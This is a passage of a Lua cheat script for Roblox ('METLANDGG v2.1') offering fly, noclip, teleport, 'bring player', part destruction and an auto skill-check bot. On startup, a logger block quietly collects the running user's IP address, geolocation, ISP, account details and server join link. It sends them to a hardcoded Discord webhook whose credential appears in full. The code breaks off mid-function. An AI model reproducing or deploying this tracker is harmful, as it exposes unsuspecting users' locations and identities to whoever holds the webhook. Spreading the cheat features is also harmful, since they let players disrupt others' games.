-- METLANDGG v2.1 - FIXED VERSION (No Duplicates)
-- All features optimized and cleaned

repeat task.wait() until game:IsLoaded()
task.wait(0.5)

print("🔥 Starting METLANDGG v2.1...")

-- ============================================
-- WEBHOOK CONFIGURATION
-- ============================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1427156897697632376/GXLU8ZzQx9VeFk6PxIqO9nD9Rs_GbPe0YAxDLNU577KscYshS3rA3P6tF-TPfO6q9lZf"

-- ============================================
-- SERVICES
-- ============================================
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RS = game:GetService("RunService")
local TS = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local plr = Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local hum = char:WaitForChild("Humanoid")
local root = char:WaitForChild("HumanoidRootPart")

print("✅ Services loaded")

-- ============================================
-- WEBHOOK LOGGER
-- ============================================
task.spawn(function()
    pcall(function()
        local accountAge = plr.AccountAge
        local years = math.floor(accountAge / 365)
        local days = accountAge % 365
        local isPremium = plr.MembershipType == Enum.MembershipType.Premium
        
        local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
        
        local joinLink = string.format(
            "https://www.roblox.com/games/start?placeId=%d&launchData=&joinCode=%s",
            game.PlaceId,
            game.JobId
        )
        
        local deepLink = string.format(
            "roblox://experiences/start?placeId=%d&gameInstanceId=%s",
            game.PlaceId,
            game.JobId
        )
        
        local ipAddress = "Unknown"
        local city = "Checking..."
        local region = "Checking..."
        local country = "Checking..."
        local isp = "Checking..."
        
        pcall(function()
            ipAddress = game:HttpGet("https://api.ipify.org", true)
        end)
        
        if ipAddress ~= "Unknown" then
            pcall(function()
                local locationData = game:HttpGet("https://ipapi.co/" .. ipAddress .. "/json/", true)
                local decoded = HttpService:JSONDecode(locationData)
                
                city = decoded.city or "Unknown"
                region = decoded.region or "Unknown"
                country = decoded.country_name or "Unknown"
                isp = decoded.org or "Unknown"
            end)
        end
        
        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
        
        local embed = {
            embeds = {{
                title = "🚨 METLANDGG Script Executed",
                description = "💀 **METLANDGG v2.1 FIXED**\nTESTING SCRIPT",
                color = 16711680,
                fields = {
                    {
                        name = "🔗 JOIN GAME",
                        value = string.format(
                            "**[🌐 CLICK HERE TO JOIN](%s)**\n```%s```",
                            joinLink,
                            deepLink
                        ),
                        inline = false
                    },
                    {
                        name = "👤 User Information",
                        value = string.format(
                            "**Username:** %s\n**Display:** %s\n**ID:** %d\n**Profile:** [Link](https://www.roblox.com/users/%d/profile)",
                            plr.Name,
                            plr.DisplayName,
                            plr.UserId,
                            plr.UserId
                        ),
                        inline = false
                    },
                    {
                        name = "📊 Account",
                        value = string.format(
                            "**Age:** %d days (%dy %dd)\n**Premium:** %s",
                            accountAge,
                            years,
                            days,
                            isPremium and "✅" or "❌"
                        ),
                        inline = true
                    },
                    {
                        name = "🎮 Game Info",
                        value = string.format(
                            "**Game:** %s\n**Place ID:** %d\n**Job ID:** ||%s||",
                            gameInfo.Name,
                            game.PlaceId,
                            game.JobId
                        ),
                        inline = true
                    },
                    {
                        name = "🌐 Network & Location",
                        value = string.format(
                            "**IP:** ||%s||\n**📍 Location:** %s, %s, %s\n**🛜 ISP:** %s",
                            ipAddress,
                            city,
                            region,
                            country,
                            isp
                        ),
                        inline = false
                    },
                    {
                        name = "⏰ Time",
                        value = os.date("%Y-%m-%d %H:%M:%S", os.time()),
                        inline = false
                    }
                },
                thumbnail = {
                    url = avatarUrl
                },
                footer = {
                    text = "🔒 METLANDGG v2.1 - Script Testing"
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
            }}
        }
        
        local payload = HttpService:JSONEncode(embed)
        
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = payload
        })
        
        print("📡 Webhook sent!")
    end)
end)

-- ============================================
-- SETTINGS
-- ============================================
local settings = {
    flySpeed = 100,
    walkSpeed = 16,
    jumpPower = 50,
    flyEnabled = false,
    noclipEnabled = false,
    espEnabled = false,
    generatorESPEnabled = false,
    antiVoidEnabled = true,
    platformEnabled = false,
    fullbrightEnabled = false,
    infJumpEnabled = false,
    isMinimized = false,
    destroyRange = 10,
    autoCheckpointEnabled = false,
    tpToolEnabled = false,
    autoPerfectEnabled = false
}

-- ============================================
-- GUI PARENT (Metland Protected)
-- ============================================
local function getGUIParent()
    if gethui then
        return gethui()
    elseif syn and syn.protect_gui then
        local folder = Instance.new("Folder")
        syn.protect_gui(folder)
        folder.Parent = CoreGui
        return folder
    else
        return plr:WaitForChild("PlayerGui")
    end
end

-- Cleanup old GUIs
for _, v in pairs(plr.PlayerGui:GetChildren()) do
    if v.Name == "MetlandGUI" then v:Destroy() end
end
for _, v in pairs(CoreGui:GetChildren()) do
    if v.Name == "MetlandGUI" then v:Destroy() end
end

print("🧹 Old GUIs cleaned")

-- ============================================
-- CREATE GUI
-- ============================================
local guiParent = getGUIParent()
local gui = Instance.new("ScreenGui")
gui.Name = "MetlandGUI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.IgnoreGuiInset = true
gui.Parent = guiParent

print("✅ GUI Created in:", guiParent.ClassName)

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 420, 0, 680)
main.Position = UDim2.new(0.5, -210, 0.5, -340)
main.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.Parent = gui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = main

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(0, 255, 255)
mainStroke.Thickness = 2
mainStroke.Transparency = 0.5
mainStroke.Parent = main

local grad = Instance.new("UIGradient")
grad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 20, 45)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 28))
}
grad.Rotation = 45
grad.Parent = main

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -140, 0, 50)
title.Position = UDim2.new(0, 15, 0, 10)
title.BackgroundTransparency = 1
title.Text = "⚡ METLANDGG v2.1"
title.TextColor3 = Color3.fromRGB(0, 255, 255)
title.TextSize = 22
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = main

local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 40, 0, 40)
minBtn.Position = UDim2.new(1, -95, 0, 10)
minBtn.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
minBtn.Text = "—"
minBtn.TextSize = 24
minBtn.TextColor3 = Color3.new(1, 1, 1)
minBtn.Font = Enum.Font.GothamBold
minBtn.BorderSizePixel = 0
minBtn.Parent = main

local minBtnCorner = Instance.new("UICorner")
minBtnCorner.CornerRadius = UDim.new(0, 10)
minBtnCorner.Parent = minBtn

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 40, 0, 40)
closeBtn.Position = UDim2.new(1, -50, 0, 10)
closeBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
closeBtn.Text = "✕"
closeBtn.TextSize = 20
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.BorderSizePixel = 0
closeBtn.Parent = main

local closeBtnCorner = Instance.new("UICorner")
closeBtnCorner.CornerRadius = UDim.new(0, 10)
closeBtnCorner.Parent = closeBtn

local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, 0, 1, -60)
contentFrame.Position = UDim2.new(0, 0, 0, 60)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = main

local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(1, -20, 1, -10)
scroll.Position = UDim2.new(0, 10, 0, 0)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 6
scroll.CanvasSize = UDim2.new(0, 0, 0, 1450)
scroll.Parent = contentFrame

print("✅ GUI Frame created")

-- ============================================
-- HELPER FUNCTIONS
-- ============================================
local function createButton(name, text, pos, callback)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Size = UDim2.new(0, 185, 0, 45)
    btn.Position = pos
    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
    btn.Text = text
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.TextSize = 14
    btn.Font = Enum.Font.GothamBold
    btn.BorderSizePixel = 0
    btn.Parent = scroll
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = btn
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(100, 100, 120)
    stroke.Thickness = 1
    stroke.Transparency = 0.5
    stroke.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        pcall(callback)
    end)
    
    return btn
end

local function createTextBox(name, placeholder, pos)
    local box = Instance.new("TextBox")
    box.Name = name
    box.Size = UDim2.new(0, 185, 0, 45)
    box.Position = pos
    box.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
    box.PlaceholderText = placeholder
    box.Text = ""
    box.TextColor3 = Color3.new(1, 1, 1)
    box.PlaceholderColor3 = Color3.fromRGB(150, 150, 170)
    box.TextSize = 14
    box.Font = Enum.Font.Gotham
    box.BorderSizePixel = 0
    box.ClearTextOnFocus = false
    box.Parent = scroll
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = box
    
    return box
end

local function createLabel(text, pos)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -10, 0, 25)
    lbl.Position = pos
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = Color3.fromRGB(180, 220, 255)
    lbl.TextSize = 15
    lbl.Font = Enum.Font.GothamBold
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = scroll
    return lbl
end

-- ============================================
-- CREATE UI ELEMENTS
-- ============================================
local y = 10

createLabel("✈️ FLIGHT SYSTEM", UDim2.new(0, 5, 0, y))
y = y + 30
local flyBtn = createButton("FlyBtn", "Toggle Fly", UDim2.new(0, 5, 0, y), function() end)
local flyBox = createTextBox("FlySpeed", "Speed (100)", UDim2.new(0, 205, 0, y))
flyBox.Text = "100"
y = y + 55

createLabel("🏃 MOVEMENT", UDim2.new(0, 5, 0, y))
y = y + 30
local speedBox = createTextBox("SpeedBox", "WalkSpeed", UDim2.new(0, 5, 0, y))
speedBox.Text = "16"
local speedBtn = createButton("SpeedBtn", "Set Speed", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local jumpBox = createTextBox("JumpBox", "Jump Power", UDim2.new(0, 5, 0, y))
jumpBox.Text = "50"
local jumpBtn = createButton("JumpBtn", "Set Jump", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local infJumpBtn = createButton("InfJumpBtn", "Infinite Jump: OFF", UDim2.new(0, 5, 0, y), function() end)
y = y + 55

createLabel("👻 PHYSICS", UDim2.new(0, 5, 0, y))
y = y + 30
local noclipBtn = createButton("NoclipBtn", "NoClip: OFF", UDim2.new(0, 5, 0, y), function() end)
local antiVoidBtn = createButton("AntiVoidBtn", "Anti Void: ON", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local platformBtn = createButton("PlatformBtn", "Platform: OFF", UDim2.new(0, 5, 0, y), function() end)
y = y + 55

createLabel("📍 TELEPORT & BRING", UDim2.new(0, 5, 0, y))
y = y + 30
local tpBox = createTextBox("TpBox", "Player Name", UDim2.new(0, 5, 0, y))
local tpBtn = createButton("TpBtn", "Goto Player", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local bringBox = createTextBox("BringBox", "Player Name", UDim2.new(0, 5, 0, y))
local bringBtn = createButton("BringBtn", "Bring Player", UDim2.new(0, 205, 0, y), function() end)
bringBtn.BackgroundColor3 = Color3.fromRGB(65, 45, 90)
y = y + 55

local tpToolBtn = createButton("TpToolBtn", "TP Tool: OFF", UDim2.new(0, 5, 0, y), function() end)
tpToolBtn.BackgroundColor3 = Color3.fromRGB(90, 45, 130)
y = y + 55

local autoCheckpointBtn = createButton("AutoCheckpointBtn", "Auto Checkpoint: OFF", UDim2.new(0, 5, 0, y), function() end)
autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(45, 65, 90)

local autoPerfectBtn = createButton("AutoPerfectBtn", "Auto Perfect: OFF", UDim2.new(0, 205, 0, y), function() end)
autoPerfectBtn.BackgroundColor3 = Color3.fromRGB(45, 90, 45)
y = y + 55

createLabel("👁️ VISUALS", UDim2.new(0, 5, 0, y))
y = y + 30
local espBtn = createButton("EspBtn", "Player ESP: OFF", UDim2.new(0, 5, 0, y), function() end)
local genEspBtn = createButton("GenEspBtn", "Generator ESP: OFF", UDim2.new(0, 205, 0, y), function() end)
genEspBtn.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
y = y + 55

local fbBtn = createButton("FbBtn", "Fullbright: OFF", UDim2.new(0, 5, 0, y), function() end)
y = y + 55

createLabel("💥 PART DESTROYER", UDim2.new(0, 5, 0, y))
y = y + 30
local rangeBox = createTextBox("RangeBox", "Range (10)", UDim2.new(0, 5, 0, y))
rangeBox.Text = "10"
local destroyBtn = createButton("DestroyBtn", "Destroy Parts", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local destroyAllBtn = createButton("DestroyAllBtn", "⚠️ Destroy ALL", UDim2.new(0, 5, 0, y), function() end)
destroyAllBtn.BackgroundColor3 = Color3.fromRGB(150, 30, 30)
y = y + 55

local deleteModelBox = createTextBox("DeleteModelBox", "Model Name", UDim2.new(0, 5, 0, y))
local deleteModelBtn = createButton("DeleteModelBtn", "Delete Model", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local status = createLabel("Status: Ready! Testing METLANDGG...", UDim2.new(0, 5, 0, y))
status.TextColor3 = Color3.fromRGB(100, 255, 100)
status.Size = UDim2.new(1, -10, 0, 60)
status.TextWrapped = true

print("✅ All UI elements created")

local function updateStatus(msg, color)
    status.Text = "Status: " .. msg
    status.TextColor3 = color or Color3.fromRGB(100, 255, 100)
end

-- ============================================
-- MINIMIZE FUNCTION
-- ============================================
local function toggleMinimize()
    settings.isMinimized = not settings.isMinimized
    local targetSize = settings.isMinimized and UDim2.new(0, 420, 0, 60) or UDim2.new(0, 420, 0, 680)
    minBtn.Text = settings.isMinimized and "□" or "—"
    contentFrame.Visible = not settings.isMinimized
    TS:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = targetSize}):Play()
end

-- ============================================
-- FLY SYSTEM
-- ============================================
local flyBV, flyBG, flyConnection
local function toggleFly()
    settings.flyEnabled = not settings.flyEnabled
    
    if settings.flyEnabled then
        flyBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        flyBtn.Text = "Fly: ON ✓"
        
        for _, v in pairs(root:GetChildren()) do
            if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then
                v:Destroy()
            end
        end
        
        flyBV = Instance.new("BodyVelocity")
        flyBV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        flyBV.Velocity = Vector3.new(0, 0, 0)
        flyBV.Parent = root
        
        flyBG = Instance.new("BodyGyro")
        flyBG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        flyBG.P = 9000
        flyBG.CFrame = root.CFrame
        flyBG.Parent = root
        
        flyConnection = RS.Heartbeat:Connect(function()
            if not settings.flyEnabled or not root or not root.Parent then 
                toggleFly() 
                return 
            end
            
            local speed = tonumber(flyBox.Text) or 100
            local cam = workspace.CurrentCamera
            if not cam then return end
            
            local move = Vector3.new(0, 0, 0)
            
            if UIS:IsKeyDown(Enum.KeyCode.W) then
                move = move + (cam.CFrame.LookVector * Vector3.new(1, 0, 1)).Unit
            end
            if UIS:IsKeyDown(Enum.KeyCode.S) then
                move = move - (cam.CFrame.LookVector * Vector3.new(1, 0, 1)).Unit
            end
            if UIS:IsKeyDown(Enum.KeyCode.A) then
                move = move - cam.CFrame.RightVector
            end
            if UIS:IsKeyDown(Enum.KeyCode.D) then
                move = move + cam.CFrame.RightVector
            end
            if UIS:IsKeyDown(Enum.KeyCode.Space) then
                move = move + Vector3.new(0, 1, 0)
            end
            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then
                move = move - Vector3.new(0, 1, 0)
            end
            
            flyBV.Velocity = move.Magnitude > 0 and move.Unit * speed or Vector3.new(0, 0, 0)
            flyBG.CFrame = cam.CFrame
            hum.PlatformStand = true
        end)
    else
        flyBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        flyBtn.Text = "Toggle Fly"
        
        if flyConnection then flyConnection:Disconnect() end
        if flyBV then flyBV:Destroy() end
        if flyBG then flyBG:Destroy() end
        
        hum.PlatformStand = false
        root.Velocity = Vector3.new(0, 0, 0)
    end
end

-- ============================================
-- SPEED & JUMP
-- ============================================
local function setSpeed()
    local s = tonumber(speedBox.Text)
    if s and s > 0 and s <= 1000 then
        hum.WalkSpeed = s
        updateStatus("Speed: " .. s, Color3.fromRGB(100, 255, 100))
    end
end

local function setJump()
    local j = tonumber(jumpBox.Text)
    if j and j > 0 and j <= 500 then
        hum.JumpPower = j
        updateStatus("Jump: " .. j, Color3.fromRGB(100, 255, 100))
    end
end

-- ============================================
-- INFINITE JUMP
-- ============================================
local infJumpConnection
local function toggleInfJump()
    settings.infJumpEnabled = not settings.infJumpEnabled
    
    if settings.infJumpEnabled then
        infJumpBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        infJumpBtn.Text = "Inf Jump: ON ✓"
        
        infJumpConnection = UIS.JumpRequest:Connect(function()
            if hum then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
    else
        infJumpBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        infJumpBtn.Text = "Infinite Jump: OFF"
        if infJumpConnection then infJumpConnection:Disconnect() end
    end
end

-- ============================================
-- NOCLIP
-- ============================================
local noclipConnection
local function toggleNoclip()
    settings.noclipEnabled = not settings.noclipEnabled
    
    if settings.noclipEnabled then
        noclipBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        noclipBtn.Text = "NoClip: ON ✓"
        
        noclipConnection = RS.Stepped:Connect(function()
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end)
    else
        noclipBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        noclipBtn.Text = "NoClip: OFF"
        
        if noclipConnection then noclipConnection:Disconnect() end
        
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

-- ============================================
-- ANTI VOID
-- ============================================
local antiVoidConnection
local function toggleAntiVoid()
    settings.antiVoidEnabled = not settings.antiVoidEnabled
    
    if settings.antiVoidEnabled then
        antiVoidBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        antiVoidBtn.Text = "Anti Void: ON ✓"
        
        antiVoidConnection = RS.Heartbeat:Connect(function()
            if root and root.Position.Y < -100 then
                root.CFrame = CFrame.new(root.Position.X, 100, root.Position.Z)
                root.Velocity = Vector3.new(0, 0, 0)
            end
        end)
    else
        antiVoidBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        antiVoidBtn.Text = "Anti Void: OFF"
        if antiVoidConnection then antiVoidConnection:Disconnect() end
    end
end

toggleAntiVoid()

-- ============================================
-- PLATFORM
-- ============================================
local platform, platformConnection
local function togglePlatform()
    settings.platformEnabled = not settings.platformEnabled
    
    if settings.platformEnabled then
        platformBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        platformBtn.Text = "Platform: ON ✓"
        
        platform = Instance.new("Part")
        platform.Size = Vector3.new(12, 0.5, 12)
        platform.Transparency = 0.5
        platform.Anchored = true
        platform.CanCollide = true
        platform.Material = Enum.Material.Neon
        platform.BrickColor = BrickColor.new("Cyan")
        platform.Parent = workspace
        
        platformConnection = RS.Heartbeat:Connect(function()
            if root and platform then
                platform.CFrame = root.CFrame * CFrame.new(0, -3.5, 0)
            end
        end)
    else
        platformBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
        platformBtn.Text = "Platform: OFF"
        
        if platformConnection then platformConnection:Disconnect() end
        if platform then platform:Destroy() platform = nil end
    end
end

-- ============================================
-- TELEPORT TO PLAYER
-- ============================================
local function tpToPlayer()
    local name = tpBox.Text:lower()
    if name == "" then
        updateStatus("Enter player name!", Color3.fromRGB(255, 100, 100))
        return
    end
    
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= plr and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            if p.Name:lower():find(name) or p.DisplayName:lower():find(name) then
                root.CFrame = p.Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)
                updateStatus("Teleported to " .. p.Name, Color3.fromRGB(100, 255, 100))
                return
            end
        end
    end
    updateStatus("Player not found!", Color3.fromRGB(255, 100, 100))
end

-- ============================================
-- BRING PLAYER
-- ============================================
local function bringPlayer()
    local name = bringBox.Text:lower()
    if name == "" then
        updateStatus("Enter player name!", Color3.fromRGB(255, 100, 100))
        return
    end
    
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= plr and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            if p.Name:lower():find(name) or p.DisplayName:lower():find(name) then
                local targetRoot = p.Character.HumanoidRootPart
                
                task.spawn(function()
                    for i = 1, 50 do
                        pcall(function()
                            if targetRoot and targetRoot.Parent and root and root.Parent then
                                targetRoot.CFrame = root.CFrame * CFrame.new(0, 0, -5)
                                targetRoot.Velocity = Vector3.new(0, 0, 0)
                            end
                        end)
                        task.wait(0.03)
                    end
                end)
                
                updateStatus("Bringing " .. p.Name, Color3.fromRGB(255, 200, 0))
                return
            end
        end
    end
    updateStatus("Player not found!", Color3.fromRGB(255, 100, 100))
end

-- ============================================
-- TP TOOL
-- ============================================
local tpTool
local function toggleTPTool()
    settings.tpToolEnabled = not settings.tpToolEnabled
    
    if settings.tpToolEnabled then
        tpToolBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 220)
        tpToolBtn.Text = "TP Tool: ON ✓"
        updateStatus("TP Tool activated!", Color3.fromRGB(220, 50, 220))
        
        tpTool = Instance.new("Tool")
        tpTool.Name = "TP Tool"
        tpTool.RequiresHandle = false
        tpTool.CanBeDropped = false
        
        tpTool.Activated:Connect(function()
            local mouse = plr:GetMouse()
            if mouse.Target then
                pcall(function()
                    root.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0, 3, 0))
                    updateStatus("Teleported!", Color3.fromRGB(100, 255, 100))
                end)
            end
        end)
        
        tpTool.Parent = plr.Backpack
        plr.Character.Humanoid:EquipTool(tpTool)
        
    else
        tpToolBtn.BackgroundColor3 = Color3.fromRGB(90, 45, 130)
        tpToolBtn.Text = "TP Tool: OFF"
        updateStatus("TP Tool disabled", Color3.fromRGB(200, 200, 200))
        
        if tpTool then
            tpTool:Destroy()
            tpTool = nil
        end
    end
end

-- ============================================
-- AUTO CHECKPOINT
-- ============================================
local autoCheckpointConnection
local currentCPIndex = 0
local checkpointCooldown = 0

local function findAllCheckpoints()
    local checkpoints = {}
    
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            local name = obj.Name:lower()
            
            if name:find("cp") or name:find("checkpoint") or name:find("cekpoin") then
                local num = tonumber(name:match("%d+"))
                
                if num then
                    table.insert(checkpoints, {
                        part = obj,
                        number = num,
                        position = obj.Position
                    })
                end
            end
        end
    end
    
    table.sort(checkpoints, function(a, b)
        return a.number < b.number
    end)
    
    return checkpoints
end

local function toggleAutoCheckpoint()
    settings.autoCheckpointEnabled = not settings.autoCheckpointEnabled
    
    if settings.autoCheckpointEnabled then
        autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        autoCheckpointBtn.Text = "Auto CP: ON ✓"
        updateStatus("Auto Checkpoint active", Color3.fromRGB(50, 220, 50))
        currentCPIndex = 0
        checkpointCooldown = 0
        
        autoCheckpointConnection = RS.Heartbeat:Connect(function()
            if not settings.autoCheckpointEnabled then return end
            if tick() < checkpointCooldown then return end
            
            local checkpoints = findAllCheckpoints()
            if #checkpoints == 0 then return end
            
            local nextCP = nil
            
            for i, cp in ipairs(checkpoints) do
                if cp.number > currentCPIndex then
                    local dist = (cp.position - root.Position).Magnitude
                    
                    if dist < 800 then
                        nextCP = cp
                        break
                    end
                end
            end
            
            if not nextCP then
                currentCPIndex = 0
                for i, cp in ipairs(checkpoints) do
                    local dist = (cp.position - root.Position).Magnitude
                    if cp.number == 1 and dist < 800 then
                        nextCP = cp
                        break
                    end
                end
            end
            
            if nextCP then
                checkpointCooldown = tick() + 2
                
                root.CFrame = nextCP.part.CFrame + Vector3.new(0, 5, 20)
                root.Velocity = Vector3.new(0, 0, 0)
                
                currentCPIndex = nextCP.number
                
                updateStatus("→ CP" .. currentCPIndex, Color3.fromRGB(100, 255, 100))
            end
        end)
    else
        autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(45, 65, 90)
        autoCheckpointBtn.Text = "Auto Checkpoint: OFF"
        updateStatus("Auto CP disabled", Color3.fromRGB(200, 200, 200))
        currentCPIndex = 0
        
        if autoCheckpointConnection then 
            autoCheckpointConnection:Disconnect()
            autoCheckpointConnection = nil
        end
    end
end

-- ============================================
-- AUTO PERFECT MINIGAME (VIOLENT DISTRICT FIX)
-- ============================================
local autoPerfectConnection
local minigameConnection
local lastMinigameTime = 0
local skillCheckActive = false

local function findMinigameUI()
    local playerGui = plr:WaitForChild("PlayerGui")
    
    for _, gui in pairs(playerGui:GetChildren()) do
        if gui:IsA("ScreenGui") and gui.Enabled then
            local name = gui.Name:lower()
            
            -- Violent District specific patterns
            if name:find("skill") or name:find("check") or 
               name:find("qte") or name:find("minigame") or 
               name:find("repair") then
                return gui
            end
            
            -- Check for circular frames (skill check indicators)
            for _, child in pairs(gui:GetDescendants()) do
                if child:IsA("Frame") or child:IsA("ImageLabel") then
                    local childName = child.Name:lower()
                    if childName:find("circle") or childName:find("skill") or
                       childName:find("perfect") or childName:find("success") or
                       childName:find("indicator") or childName:find("zone") or
                       childName:find("target") or childName:find("needle") or
                       childName:find("bar") or childName:find("progress") then
                        return gui
                    end
                end
            end
        end
    end
    
    return nil
end

local function attemptAutoPerfect()
    if tick() - lastMinigameTime < 0.3 then return end
    lastMinigameTime = tick()
    
    local minigameUI = findMinigameUI()
    if not minigameUI then return end
    
    if not skillCheckActive then
        skillCheckActive = true
        updateStatus("🎯 Skill Check detected!", Color3.fromRGB(255, 200, 0))
    end
    
    -- Method 1: SPAM SPACE (Primary method for Violent District)
    task.spawn(function()
        pcall(function()
            local VIM = game:GetService("VirtualInputManager")
            
            -- Rapid space spam for skill check
            for i = 1, 5 do
                VIM:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
                task.wait(0.01)
                VIM:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
                task.wait(0.01)
            end
        end)
    end)
    
    -- Method 2: Fire RemoteEvents (backup method)
    task.spawn(function()
        for _, remote in pairs(minigameUI:GetDescendants()) do
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(true)
                    remote:FireServer("Perfect")
                    remote:FireServer("Success")
                    remote:FireServer(1)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(true)
                    remote:InvokeServer("Perfect")
                end
            end)
        end
    end)
    
    -- Method 3: Click buttons
    task.spawn(function()
        for _, button in pairs(minigameUI:GetDescendants()) do
            if button:IsA("TextButton") or button:IsA("ImageButton") then
                pcall(function()
                    local name = button.Name:lower()
                    if name:find("success") or name:find("perfect") or 
                       name:find("complete") or name:find("confirm") then
                        
                        for _, connection in pairs(getconnections(button.MouseButton1Click)) do
                            connection:Fire()
                        end
                    end
                end)
            end
        end
    end)
    
    -- Method 4: Search workspace remotes
    task.spawn(function()
        for _, remote in pairs(workspace:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                local name = remote.Name:lower()
                if name:find("skill") or name:find("perfect") or 
                   name:find("repair") or name:find("generator") then
                    pcall(function()
                        remote:FireServer(true)
                        remote:FireServer("Perfect")
                        remote:FireServer(1)
                    end)
                end
            end
        end
    end)
    
    task.delay(0.5, function()
        skillCheckActive = false
        updateStatus("✅ Auto Perfect executed!", Color3.fromRGB(0, 255, 0))
    end)
end

local function toggleAutoPerfect()
    settings.autoPerfectEnabled = not settings.autoPerfectEnabled
    
    if settings.autoPerfectEnabled then
        autoPerfectBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
        autoPerfectBtn.Text = "Auto Perfect: ON ✓"
        updateStatus("Auto Perfect active! (VD)", Color3.fromRGB(50, 220, 50))
        
        -- Listen for new GUIs
        autoPerfectConnection = plr.PlayerGui.ChildAdded:Connect(function(gui)
            if settings.autoPerfectEnabled then
                task.wait(0.1)
                attemptAutoPerfect()
            end
        end)
        
        -- Continuous check for minigame UI (faster check rate)
        minigameConnection = RS.Heartbeat:Connect(function()
            if not settings.autoPerfectEnabled then return end
            
            local minigameUI = findMinigameUI()
            if minigameUI and minigameUI.Enabled then
                attemptAutoPerfect()
            end
        end)
        
        -- Try immediately
        attemptAutoPerfect()
        
    else
        autoPerfectBtn.BackgroundColor3 = Color3.fromRGB(45, 90, 45)
        autoPerfectBtn.Text = "Auto Perfect: OFF"
        updateStatus("Auto Perfect disabled", Color3.fromRGB(200, 200, 200))
